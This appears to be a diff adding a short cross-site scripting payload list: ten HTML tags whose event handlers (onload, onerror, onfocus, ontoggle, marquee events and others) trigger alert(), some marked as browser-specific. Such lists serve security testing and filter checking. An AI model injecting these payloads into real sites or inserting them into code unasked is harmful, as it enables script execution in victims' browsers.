@@ -1,0 +1,10 @@
+<body onload=alert()>
+<img src=x onerror=alert()>
+<svg onload=alert()>
+<body onpageshow=alert(1)>
+<div style="width:1000px;height:1000px" onmouseover=alert()></div>
+<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
+<marquee onstart=alert(1)> (firefox only)
+<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)
+<input autofocus="" onfocus=alert(1)></input>
+<details open ontoggle="alert()">  (chrome & opera only)
